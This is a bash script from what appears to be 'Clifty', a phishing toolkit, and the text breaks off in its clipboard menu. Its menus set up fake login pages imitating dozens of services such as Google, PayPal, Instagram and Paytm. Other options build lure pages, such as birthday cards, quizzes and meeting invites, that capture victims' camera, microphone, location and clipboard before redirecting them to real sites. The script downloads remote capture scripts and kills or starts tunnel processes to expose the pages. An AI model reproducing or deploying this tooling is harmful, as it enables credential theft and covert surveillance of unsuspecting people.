##COLOUR TEXT
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
LGRAY="\e[37m"
GRAY="\e[90m"
LRED="\e[91m"
LGREEN="\e[92m"
LYELLOW="\e[93m"
LBLUE="\e[94m"
LMAGENTA="\e[95m"
LCYAN="\e[96m"
WHITE="\e[97m"
NC="\e[0m" #Reset colour

##COLOUR BG
BLACKBG="\e[40m"
REDBG="\e[41m"
GREENBG="\e[42m"
YELLOWBG="\e[43m"
BLUEBG="\e[44m"
MAGENTABG="\e[45m"
CYANBG="\e[46m"
LGRAYBG="\e[47m"
GRAYBG="\e[100m"
LREDBG="\e[101m"
LGREENBG="\e[102m"
LYELLOWBG="\e[103m"
LBLUEBG="\e[104m"
LMAGENTABG="\e[105m"
LCYANBG="\e[106m"
WHITEBG="\e[107m"
RESETBG="\e[0m\n" #Reset background

## COLOUR FONT - BOLD
BOLDBLACK="\e[1;30m"
BOLDRED="\e[1;31m"
BOLDGREEN="\e[1;32m"
BOLDYELLOW="\e[1;33m"
BOLDBLUE="\e[1;34m"
BOLDMAGENTA="\e[1;35m"
BOLDCYAN="\e[1;36m"
BOLDLGRAY="\e[1;37m"
BOLDGRAY="\e[1;90m"
BOLDLRED="\e[1;91m"
BOLDLGREEN="\e[1;92m"
BOLDLYELLOW="\e[1;93m"
BOLDLBLUE="\e[1;94m"
BOLDLMAGENTA="\e[1;95m"
BOLDLCYAN="\e[1;96m"
BOLDWHITE="\e[1;97m"
## COLOUR FONT - FAINT
FAINTBLACK="\e[2;30m"
FAINTRED="\e[2;31m"
FAINTGREEN="\e[2;32m"
FAINTYELLOW="\e[2;33m"
FAINTBLUE="\e[2;34m"
FAINTMAGENTA="\e[2;35m"
FAINTCYAN="\e[2;36m"
FAINTLGRAY="\e[2;37m"
FAINTGRAY="\e[2;90m"
FAINTLRED="\e[2;91m"
FAINTLGREEN="\e[2;92m"
FAINTLYELLOW="\e[2;93m"
FAINTLBLUE="\e[2;94m"
FAINTLMAGENTA="\e[2;95m"
FAINTLCYAN="\e[2;96m"
FAINTWHITE="\e[2;97m"
## COLOUR FONT - ITALIC
ITALICBLACK="\e[3;30m"
ITALICRED="\e[3;31m"
ITALICGREEN="\e[3;32m"
ITALICYELLOW="\e[3;33m"
ITALICBLUE="\e[3;34m"
ITALICMAGENTA="\e[3;35m"
ITALICCYAN="\e[3;36m"
ITALICLGRAY="\e[3;37m"
ITALICGRAY="\e[3;90m"
ITALICLRED="\e[3;91m"
ITALICLGREEN="\e[3;92m"
ITALICLYELLOW="\e[3;93m"
ITALICLBLUE="\e[3;94m"
ITALICLMAGENTA="\e[3;95m"
ITALICLCYAN="\e[3;96m"
ITALICWHITE="\e[3;97m"
## COLOUR FONT - UNDERLINE
ULBLACK="\e[4;30m"
ULRED="\e[4;31m"
ULGREEN="\e[4;32m"
ULYELLOW="\e[4;33m"
ULBLUE="\e[4;34m"
ULMAGENTA="\e[4;35m"
ULCYAN="\e[4;36m"
ULLGRAY="\e[4;37m"
ULGRAY="\e[4;90m"
ULLRED="\e[4;91m"
ULLGREEN="\e[4;92m"
ULLYELLOW="\e[4;93m"
ULLBLUE="\e[4;94m"
ULLMAGENTA="\e[4;95m"
ULLCYAN="\e[4;96m"
ULWHITE="\e[4;97m"
##RESET ALL FONT AND COLOUR
NF="\e[0;0m" 
NA="${NC}${NF}"


##IMPORTANT VARIABLES
#Directories---
pro_dir=$(pwd) #project directory
server_dir="${pro_dir}/.server" #server directory
www_dir="${pro_dir}/.server/www" #www directory
assets_dir="${pro_dir}/assets" #assets directory
fetch_dir="${pro_dir}/assets/fetch" #fetch directory
dgf_dir="${pro_dir}/assets/dgf" #dgf directory
dumps_dir="${pro_dir}/assets/dumps" #dumps directory
update_dir="${pro_dir}/assets/update" #update dir
sites_dir="${pro_dir}/.sites" #sites directory
logs_dir="${pro_dir}/logs" #logs directory
log_dir_name=$(date +%d-%m-%Y-%H-%M-%S)
log_name=logs.txt
final_log_dir="${pro_dir}/logs/${log_dir_name}"
final_log_name="${final_log_dir}/logs.txt"

#Date---
date_date=$(date +%d)
date_month=$(date +%m)
date_year=$(date +%Y)
date_hour=$(date +%H)
date_minute=$(date +%M)
date_second=$(date +%S)
date_nanosec=$(date +%n)

#Links
link_clifty="https://github.com/Alygnt/Clifty"
link_modules_raw="https://raw.githubusercontent.com/Alygnt/phisher-modules"

#Prompt---
prompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty${NF} >>${NA} ${CYAN}")"

#Variables---
site_access="" #to store access type i.e login, cam, mic, etc
site_name="" # To store site name
site_id="" # To store site id 
site_template="" #to store site type i.e default, poll etc
rdurl="" #to store default redirect URL
dgfname="" #to store zip name for downloading the site
capture_type="" #to store capture type i.e otp, notp, etc

myip="" #to store ausers ip
netstats="" #to store network type
plainnetstats="" #to store network type in plain

tunnel_name="" #to store tunnel type i.e ngrok, etc
tunnel_id="" #to store tunnel id i.e ngrok, etc

#Normal Banner
banner(){
        echo -e " "
        echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
	echo -e "${MAGENTA}|       ${CYAN} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
        echo -e ""
}
# Credits banner
cbanner(){
        echo -e " "
        echo -e "${MAGENTA}-----------------------------------------------------------${NC} "
	echo -e "${MAGENTA}|       ${CYAN} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝     ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║█████╗     ██║    ╚████╔╝      ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝       ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN}╚██████╗███████╗██║██║        ██║      ██║        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}|       ${CYAN} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝        ${MAGENTA}|${NC}"
	echo -e "${MAGENTA}-----------------------------------------------------------${NC}"
	echo -e "${BOLDBLUE}           ᴠᴇʀsɪᴏɴ 1.4               ＢＹ －ＡＬＹＧＮＴ           ${NC}"
        echo -e ""
}
#Small Banner
sbanner(){
	echo -e " "
	echo -e "${CYAN} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
	echo -e "${CYAN} ░█░░░█░░░░█░░█▀▀░░█░░███ ${NC}"
	echo -e "${CYAN} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
	echo -e "${NC} "
}

## Directories
directories(){
        if [[ ! -d "${server_dir}" ]]; then
                mkdir -p "${server_dir}"
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created server directory"
        fi
        if [[ ! -d "${logs_dir}" ]]; then
                mkdir -p "${logs_dir}"
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Logs directory"
        fi
        
        if [[ ! -d "${fetch_dir}" ]]; then
                mkdir "${fetch_dir}"
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created Fetch directory"
        fi     
        if [[ -d "${www_dir}" ]]; then
                rm -rf "${www_dir}"
                mkdir -p "${www_dir}"
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
        else
                mkdir -p "${www_dir}"
                
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Created www directory"
        fi
        if [[ -e ".cld.log" ]]; then
                rm -rf ".cld.log"
        fi
        if [[  ! -e "${fetch_dir}/ip.php" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/ip.php > /dev/null 2>&1
                mv ip.php ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded ip.php"
        fi
        if [[ ! -e "${fetch_dir}/index.php" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/index.php > /dev/null 2>&1
                mv index.php ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded index.php"
        fi
        if [[ ! -e "${fetch_dir}/device.js" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
                mv device.js ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
        fi
        if [[ ! -e "${fetch_dir}/device_post.php" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device_post.php > /dev/null 2>&1
                mv device_post.php ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device_post.php"
        fi
        if [[ ! -e "${fetch_dir}/device.js" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.js > /dev/null 2>&1
                mv device.js ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.js"
        fi
        if [[ ! -e "${fetch_dir}/device.html" ]]; then
                wget --no-check-certificate ${link_modules_raw}/sites/fetch/device.html > /dev/null 2>&1
                mv device.html ${fetch_dir}/
                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloaded device.html"
        fi
}

#Dependencies
dependencies() {
        echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Installing required packages..."
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}${NC}"
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}${NC}"
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color

    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "clifty.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 clifty.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
update(){
	status
	if [ $plainnetstats == "online" ]; then
                { clear; banner; }
                lat_ver=$( cat ${update_dir}/version.txt )
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Updating ( Version: ${lat_ver} ) ${NC} "
		cd ${pro_dir}
                lat_ver=$( cat ${update_dir}/version.txt )
                git reset --hard
                git pull
                echo -e " "
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
                sleep 2
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${MAGENTA} RESTARTING THE TOOL!!${NC} "
                cd ${pro_dir}
                chmod 777 clifty.sh
                bash clifty.sh
                
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED}Your offline, Check your internet and try again."
		sleep 5
		homepage
	fi
}

status() {     
        myip=$(curl -s ipinfo.io/ip)
	if [ -z $myip ]; then
		myip="${BOLDRED}Offline"
		netstats="${BOLDRED}Offline"
                plainnetstats="offline"
	else
		myip="${BOLDGREEN}$myip"
		netstats="${BOLDGREEN}Online"
                plainnetstats="online"
	fi           
}
status_display(){
        { clear; banner; }
        if [[ ! -z $myip ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}Your IP address = $myip${NA}"
        else
                status
        fi
        if [[ ! -z $netstats ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}Network Status = $netstats${NA}"
        else
                status
        fi
        if [[ ! -z $site_access ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}SITE TYPE${NA}: ${BOLDMAGENTA}${site_access}${NA}"
        fi
        if [[ ! -z $site_name ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}SITE NAME${NA}: ${BOLDMAGENTA}${site_name}${NA}"
        fi
        if [[ ! -z $site_template ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}TEMPLATE${NA} : ${BOLDMAGENTA}${site_template}${NA}"
        fi
        if [[ ! -z $tunnel_name ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}TUNNELER${NA} : ${BOLDMAGENTA}${tunnel_name}${NA}"
        fi
        if [[ ! -z $PORT ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}PORT    ${NA} : ${BOLDMAGENTA}${PORT}${NA}"
        fi
        if [[ ! -z $rdurl ]]; then
		echo -e "\t\t${GREEN})) ${CYAN}REDIRECT${NA} : ${BOLDMAGENTA}${rdurl}${NA}"
        fi
        echo -e ""
        echo -e ""
}

homepage() {
status_display
if [[ ! -d "${site_dir}" ]]; then
        d4site="Download"
else
        d4site="Delete"
fi 
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${GREEN} Login          ${NC}""${CYAN} [A]${MAGENTA} About             ${NC}"
echo -e "${CYAN} [2]${GREEN} Camera         ${NC}""${CYAN} [B]${MAGENTA} Request site      ${NC}"
echo -e "${CYAN} [3]${GREEN} Microphone     ${NC}""${CYAN} [C]${MAGENTA} Report Issue      ${NC}"
echo -e "${CYAN} [4]${GREEN} Location       ${NC}""${CYAN} [D]${MAGENTA} ${d4site} All sites${NC}"
echo -e "${CYAN} [5]${GREEN} Clipboard      ${NC}""${CYAN} [E]${MAGENTA} Logs              ${NC}"
echo -e "${CYAN} [6]${GREEN} Pattern        ${NC}""${CYAN} [F]${MAGENTA} Update            ${NC}"
echo -e "${CYAN} [7]${GREEN} IP address     ${NC}""${CYAN} [G]${MAGENTA} Open Discussions  ${NC}"
echo -e " "
echo -e "${CYAN}              [X/0]${RED} EXIT ${NC}"
echo -e " "
 read -p "${prompt}" reply_home
case $reply_home in
        1 )
		menu_login;;
        2 )
		menu_camera;;
        3 )
		menu_microphone;;
        4 )
		menu_location;;
        5 )
		menu_clipboard;;
        6 )
		menu_pattern;;
        7 )  
		menu_ip;;
	A | a)
		xdg-open ${link_clifty}
		{ sleep 2; clear;  banner; homepage; };;
	B | b )
                xdg-open ${link_clifty}/discussions/new?category=new-site
		{ sleep 2; clear; banner; homepage; };;
        C | c)
                xdg-open ${link_clifty}/issues/new
		{ sleep 2; clear; banner; homepage; };;
        D | d)
                dsites;;
	E | e)
		logs_check;;
	F | f)
		update;;
        G | g)
                xdg-open ${link_clifty}/discussions
		{ sleep 2; clear; banner; homepage; };;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; homepage; };;
esac
tunnel_menu
}

menu_login() {
status_display
site_access="login"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A SITE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Adobe         ${NC}""${CYAN} [26]${MAGENTA} Mediafire    ${NC}""${CYAN} [51]${MAGENTA} Telenor       ${NC}"
echo -e "${CYAN} [2]${MAGENTA} Airtel Sim    ${NC}""${CYAN} [27]${MAGENTA} Messenger    ${NC}""${CYAN} [52]${MAGENTA} Tiktok        ${NC}"
echo -e "${CYAN} [3]${MAGENTA} AirtelXstream ${NC}""${CYAN} [28]${MAGENTA} Microsoft    ${NC}""${CYAN} [53]${MAGENTA} Twitch        ${NC}"
echo -e "${CYAN} [4]${MAGENTA} Ajio          ${NC}""${CYAN} [29]${MAGENTA} Mobikwik     ${NC}""${CYAN} [54]${MAGENTA} Twitter       ${NC}"
echo -e "${CYAN} [5]${MAGENTA} Amazon        ${NC}""${CYAN} [30]${MAGENTA} Myspace      ${NC}""${CYAN} [55]${MAGENTA} Ubereats      ${NC}"
echo -e "${CYAN} [6]${MAGENTA} Apple         ${NC}""${CYAN} [31]${MAGENTA} Netflix      ${NC}""${CYAN} [56]${MAGENTA} verizon       ${NC}"
echo -e "${CYAN} [7]${MAGENTA} Badoo         ${NC}""${CYAN} [32]${MAGENTA} Ola          ${NC}""${CYAN} [57]${MAGENTA} VI            ${NC}"
echo -e "${CYAN} [8]${MAGENTA} Clash of Clans${NC}""${CYAN} [33]${MAGENTA} Origin       ${NC}""${CYAN} [58]${MAGENTA} VK            ${NC}"
echo -e "${CYAN} [9]${MAGENTA} Date          ${NC}""${CYAN} [34]${MAGENTA} Paypal       ${NC}""${CYAN} [59]${MAGENTA} Whatsapp      ${NC}"
echo -e "${CYAN} [10]${MAGENTA} Devianart    ${NC}""${CYAN} [35]${MAGENTA} Paytm        ${NC}""${CYAN} [60]${MAGENTA} Wordpress     ${NC}"
echo -e "${CYAN} [11]${MAGENTA} DropBox      ${NC}""${CYAN} [36]${MAGENTA} Phonepe      ${NC}""${CYAN} [61]${MAGENTA} Xbox          ${NC}"
echo -e "${CYAN} [12]${MAGENTA} Ebay         ${NC}""${CYAN} [37]${MAGENTA} Pinterest    ${NC}""${CYAN} [62]${MAGENTA} Yahoo         ${NC}"
echo -e "${CYAN} [13]${MAGENTA} Facebook     ${NC}""${CYAN} [38]${MAGENTA} Playstation  ${NC}""${CYAN} [63]${MAGENTA} Yandex        ${NC}"
echo -e "${CYAN} [14]${MAGENTA} Flipcart     ${NC}""${CYAN} [39]${MAGENTA} ProtonMail   ${NC}""${CYAN} [64]${MAGENTA} Youtube Subs  ${NC}"
echo -e "${CYAN} [15]${MAGENTA} Freefire     ${NC}""${CYAN} [40]${MAGENTA} Pubg         ${NC}""${CYAN} [65]${MAGENTA} Discord       ${NC}"
echo -e "${CYAN} [16]${MAGENTA} Github       ${NC}""${CYAN} [41]${MAGENTA} Quora        ${NC}""${CYAN} [66]${MAGENTA} Google WIFI   ${NC}"
echo -e "${CYAN} [17]${MAGENTA} Gitlab       ${NC}""${CYAN} [42]${MAGENTA} Reddit       ${NC}""${CYAN} [67]${MAGENTA} Mobile Pattern${NC}"
echo -e "${CYAN} [18]${MAGENTA} Gmail        ${NC}""${CYAN} [43]${MAGENTA} Shopify      ${NC}"
echo -e "${CYAN} [19]${MAGENTA} Google       ${NC}""${CYAN} [44]${MAGENTA} Snapchat     ${NC}"
echo -e "${CYAN} [20]${MAGENTA} Gpay         ${NC}""${CYAN} [45]${MAGENTA} Socialclub   ${NC}"
echo -e "${CYAN} [21]${MAGENTA} icloud       ${NC}""${CYAN} [46]${MAGENTA} Spotify      ${NC}"
echo -e "${CYAN} [22]${MAGENTA} Instagram    ${NC}""${CYAN} [47]${MAGENTA} Stackoverflow${NC}"
echo -e "${CYAN} [23]${MAGENTA} Jazz         ${NC}""${CYAN} [48]${MAGENTA} Steam        ${NC}"
echo -e "${CYAN} [24]${MAGENTA} Jio          ${NC}""${CYAN} [49]${MAGENTA} Subitout     ${NC}"
echo -e "${CYAN} [25]${MAGENTA} Linkedin     ${NC}""${CYAN} [50]${MAGENTA} Telegram     ${NC}"
echo -e " "
echo -e "${CYAN} [X]${RED} Back to ${ULRED}HOME PAGE${NF}"
echo -e " "
read -p "${prompt}" reply_login
echo -e " "
case $reply_login in
        1 | 01)
                login_adobe;;
        2 | 02)
                login_airtelsim;;
	3 | 03)
                login_airtelxstream;;
	4 | 04)
		login_ajio;;
	5 | 05)
                login_amazon;;
        6 | 06)
                login_apple;;
	7 | 07)
                login_badoo;;
        8 | 08)
                login_clashofclans;;
	9 | 09)
                login_date;;
        10)
                login_devianart;;
	11)
                login_dropbox;;
	12)
                login_ebay;;
        13)
                login_facebook;;
	14)
                login_flipcart;;
	15)
                login_freefire;;
        16)
                login_github;;
	17)
                login_gitlab;;
	18)
                login_gmail;;
        19)
                login_google;;
	20)
	        login_gpay;;
	21)
                login_icloud;;
	22)
                login_instagram;;
	23)
                login_jazz;;
        24)
                login_jio;;
        25)
                login_linkedin;;
        26)
                login_mediafire;;
	27)
                login_messenger;;
	28)
                login_microsoft;;
	29)
                login_mobiwik;;
	30)
                login_myspace;;
	31)
                login_netflix;;
	32)
                login_ola;;
	33)
                login_origin;;
	34)
                login_paypal;;
	35)
                login_paytm;;
	36)
                login_phonepe;;
	37)
                login_pinterest;;
	38)
		login_playstation;;
	39)
                login_protonmail;;
	40)
                login_pubg;;
	41)
                login_quora;;
	42)
                login_reddit;;
	43)
                login_shopify;;
	44)
                login_snapchat;;
	45)
                login_socialclub;;
	46)
                login_spotify;;
	47)
                login_stackoverflow;;
	48)
                login_steam;;
	49)
                login_subitoit;;
	50)
                login_telegram;;
	51)
                login_telenor;;
	52)
                login_tiktok;;
        53)
                login_twitch;;
	54)
                login_twitter;;
        55)
                login_ubereats;;
	56)
                login_verizon;;
        57)
                login_visim;;
	58)
                login_vk;;
        59)
                login_whatsapp;;
	60)
                login_wordpress;;
        61)
                login_xbox;;
	62)
                login_yahoo;;
        63)
                login_yandex;;
	64)
                login_ytsubs;;
	65)
		login_discord;;
	66)
		login_googlewifi;;
	67)
		login_pattern;;
        X | x)
                menu_login;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; clear; menu_login; };;
esac
}
menu_camera(){
status_display
site_access="camera"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN}     IMAGE            ${NC}""${CYAN}     VIDEO             ${NC}"
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}""${CYAN} [A]${MAGENTA} Filter            ${NC}"
echo -e "${CYAN} [2]${MAGENTA} Birthday       ${NC}""${CYAN} [B]${MAGENTA} Online Meet       ${NC}"
echo -e "${CYAN} [3]${MAGENTA} Book           ${NC}" 
echo -e "${CYAN} [4]${MAGENTA} Box Wish       ${NC}"
echo -e "${CYAN} [5]${MAGENTA} Firework       ${NC}"
echo -e "${CYAN} [6]${MAGENTA} Game           ${NC}"
echo -e "${CYAN} [7]${MAGENTA} Guess          ${NC}"
echo -e "${CYAN} [8]${MAGENTA} Quiz           ${NC}"
echo -e "${CYAN} [9]${MAGENTA} RPS            ${NC}"
echo -e "${CYAN} [10]${MAGENTA} Selfie        ${NC}"
echo -e "${CYAN} [11]${MAGENTA} Spinwheel     ${NC}"
echo -e " "
echo -e "${CYAN}              [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_camera
case $reply_camera in
        1 )
                site_id="default"
                dgfname="default"
                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
                site_name="Image"
                capture_type="IMG"
                site_template="Default" ;;
        2 )
                site_id="birthday"
                dgfname="birthday"
                rdurl="www.homemade-gifts-made-easy.com/image-files/happy-birthday-images-many-blessings-600x900.jpg"
                site_name="Image"
                capture_type="IMG"
                site_template="Birthday" ;;
        3 )
                site_id="book"
                dgfname="book"
                rdurl="www.amazon.in/Think-Grow-Rich-Napoleon-Hill/dp/8194790883"
                site_name="Image"
                capture_type="IMG"
                site_template="Book" ;;
        4 )
                site_id="boxwish"
                dgfname="boxwish"
                rdurl="www.google.com"
                site_name="Image"
                capture_type="IMG"
                site_template="Box Wish" ;;
        5 )
                site_id="firework"
                dgfname="firework"
                rdurl="www.fireworks.com"
                site_name="Image"
                capture_type="IMG"
                site_template="Firework" ;;
        6 )
                site_id="game"
                dgfname="game"
                rdurl="www.chess.com"
                site_name="Image"
                capture_type="IMG"
                site_template="Game" ;;
        7 )
                site_id="guess"
                dgfname="guess"
                rdurl="www.guess.com"
                site_name="Image"
                capture_type="IMG"
                site_template="Guess" ;;
	8 )
                site_id="quiz"
                dgfname="quiz"
                rdurl="www.quiz.com"
                site_name="Image"
                capture_type="IMG"
                site_template="Quiz" ;;
        9 )
                site_id="rps"
                dgfname="rps"
                rdurl="www.google.com"
                site_name="Image"
                capture_type="IMG"
                site_template="RPS" ;;
        10 )
                site_id="selfie"
                dgfname="selfie"
                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
                site_name="Image"
                capture_type="IMG"
                site_template="Selfie" ;;
        11 )
                site_id="spinwheel"
                dgfname="spinwheel"
                rdurl="www.luckydraw.live"
                site_name="Image"
                capture_type="IMG"
                site_template="Spin Wheel" ;;
        A | a )
                site_id="filter"
                dgfname="filter"
                rdurl="www.snapchat.com"
                site_name="Video"
                capture_type="VID"
                site_template="Filter" ;;
        B | b )
                site_id="onlinemeet"
                dgfname="onlinemeet"
                rdurl="www.zoom.us"
                site_name="Video"
                capture_type="VID"
                site_template="Online Meet" ;;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_camera; };;
esac    
}
menu_microphone(){
status_display
site_access="microphone"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
echo -e "${CYAN} More sites are coming soon   ${NC}"
echo -e " "
echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_microphone
case $reply_microphone in
        1 )
                site_id="default"
                dgfname="default"
                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
                site_name="Microphone"
                capture_type="MIC"
                site_template="Default" ;;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_microphone; };;
esac    
}
menu_location(){
status_display
site_access="location"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Google Drive   ${NC}"
echo -e "${CYAN} [2]${MAGENTA} Near You       ${NC}"
echo -e "${CYAN} [3]${MAGENTA} Weather        ${NC}"
echo -e "${CYAN} [4]${MAGENTA} Zoom Meet      ${NC}"
echo -e "${CYAN} More sites are coming soon   ${NC}"
echo -e " "
echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_location
case $reply_location in
        1 )
                site_id="gdrive"
                dgfname="gdrive"
                rdurl="www.drive.google.com"
                site_name="Location"
                capture_type="LOC"
                site_template="Google Drive" ;;
        2 )
                site_id="nearyou"
                dgfname="nearyou"
                rdurl="www.maps.google.com"
                site_name="Location"
                capture_type="LOC"
                site_template="Default" ;;
        3 )
                site_id="weather"
                dgfname="weather"
                rdurl="www.accuweather.com/"
                site_name="Location"
                capture_type="LOC"
                site_template="Default" ;;
        4 )
                site_id="zoom"
                dgfname="zoom"
                rdurl="www.zoom.us"
                site_name="Location"
                capture_type="LOC"
                site_template="Zoom" ;;
	0 | 00 | x | X | exit)
		msg_exit;;
        
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; clear; menu_location; };;
esac    
}
menu_clipboard(){
status_display
site_access="clipboard"
echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
echo -e ""
echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
echo -e "${CYAN} More sites are coming soon   ${NC}"
echo -e " "
echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
echo -e " "
read -p "${prompt}" reply_clipboard
case $reply_clipboard in
        1 )
                site_id="default"
                dgfname="default"
                rdurl="www.google.com"
                site_name="Clipboard"
                capture_type="CLIP"
                site_template="Default" ;;
	0 | 00 | x | X | exit)
